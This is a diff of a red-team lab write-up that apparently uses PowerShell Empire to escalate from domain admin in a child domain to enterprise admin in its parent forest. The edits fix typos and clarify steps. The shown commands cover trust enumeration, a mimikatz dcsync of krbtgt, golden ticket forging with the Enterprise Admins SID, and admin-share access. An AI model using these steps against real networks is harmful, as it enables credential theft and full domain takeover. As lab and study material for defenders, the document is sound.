@@ -98,7 +98,7 @@ Listing the processes with `ps`, we can see number of process running under the 
 
 ![](../../.gitbook/assets/empire-ps.png)
 
-The domain user is of interest, so we would use a `usemodule situational_awareness/network/powerview/get_user` command to enumerate the red\spotless user and see if it is a member of any interesting groups, however my empire instance did not seem to return any results for this command. For this lab, assume it showd that the user red\spotless is a member of `Administrators` group on the `red.offense.local` domain.
+The domain user is of interest, so we would use a `usemodule situational_awareness/network/powerview/get_user` command to enumerate the red\spotless user and see if it is a member of any interesting groups, however my empire instance did not seem to return any results for this command. For this lab, assume it showed that the user red\spotless is a member of `Administrators` group on the `red.offense.local` domain.
 
 ### Token Manipulation
 
@@ -134,25 +134,27 @@ usemodule lateral_movement/invoke_wmi
 
 ![](../../.gitbook/assets/empire-lateral-childdc.png)
 
-We now have the agent back, let's just confirm where we landed:
+We now have the agent back, let's just confirm it:
 
 ![](../../.gitbook/assets/empire-childdc-recon.png)
 
 ### Checking Trust Relationships
 
-From DC-RED, let's check any domain trust relationships - we see that the `red.offense.local` is a child domain, which is automatically trusting and trusted \(two way trusts\) with/between `offense.local`:
+Once in DC-RED, let's check any domain trust relationships:
 
-```text
+```csharp
 usemodule situational_awareness/network/powerview/get_domain_trust
 ```
 
 ![](../../.gitbook/assets/empire-trusts.png)
 
+We see that the `red.offense.local` is a child domain of `offense.local` domain, which is automatically trusting and trusted \(two way trust/bidirectional\) with `offense.local` - read on.
+
 ### From DA to EA
 
-We will now try to escalate from DA in red.offense.local to EA in offense.local. For this, we first need to create a golden ticket for `red.offense.local` and forge it to make us become an EA in offense.local.
+We will now try to escalate from DA in `red.offense.local` to EA in `offense.local`. We need to create a golden ticket for `red.offense.local` and forge it to make us an EA in `offense.local`.
 
-First of, getting a SID of a `krbtgt` user account in `red.offense.local`:
+First of, getting a SID of a `krbtgt` user account in `offense.local`:
 
 ```csharp
 (Empire: powershell/situational_awareness/network/powerview/get_domain_trust) > usemodule powershell/management/user_to_sid
@@ -163,9 +165,9 @@ First of, getting a SID of a `krbtgt` user account in `red.offense.local`:
 
 ![](../../.gitbook/assets/empire-krbtgt-sid.png)
 
-After that, a password hash of the `krbtgt` accoutn in of the compromised `DC-RED`:
+After getting a SID of the `offense.local\krbtgt`, we need to get a password hash of the `krbtgt` account in the compromised DC `DC-RED` \(we can extract it since we are a domain admin in `red.offense.local`\):
 
-```text
+```csharp
 (Empire: powershell/management/user_to_sid) > usemodule powershell/credentials/mimikatz/dcsync
 (Empire: powershell/credentials/mimikatz/dcsync) > set user red\krbtgt
 (Empire: powershell/credentials/mimikatz/dcsync) > execute
@@ -180,8 +182,7 @@ We can now generate a golden ticket for `offense.local\Domain Admins`since we ha
 ```csharp
 usemodule powershell/credentials/mimikatz/golden_ticket
 (Empire: powershell/credentials/mimikatz/golden_ticket) > set user hakhak
-(Empire: powershell/credentials/mimikatz/golden_ticket) > 
-cr
+(Empire: powershell/credentials/mimikatz/golden_ticket) > set sids S-1-5-21-4172452648-1021989953-2368502130-519
 (Empire: powershell/credentials/mimikatz/golden_ticket) > set CredID 8
 (Empire: powershell/credentials/mimikatz/golden_ticket) > run
 ```
@@ -192,7 +193,7 @@ The `CredID` property in the dcsync module comes from the Empire's credential st
 
 ![](../../.gitbook/assets/empire-creds.png)
 
-We now should be Enterprise Admin in `offense.local`and we can test it by listing the admin share c$ of the `dc-mantvydas.offense.local:`
+We now should be Enterprise Admin in `offense.local`and we can test it by listing the admin share `c$` of the `dc-mantvydas.offense.local:`
 
 ```csharp
 shell dir \\dc-mantvydas\c$
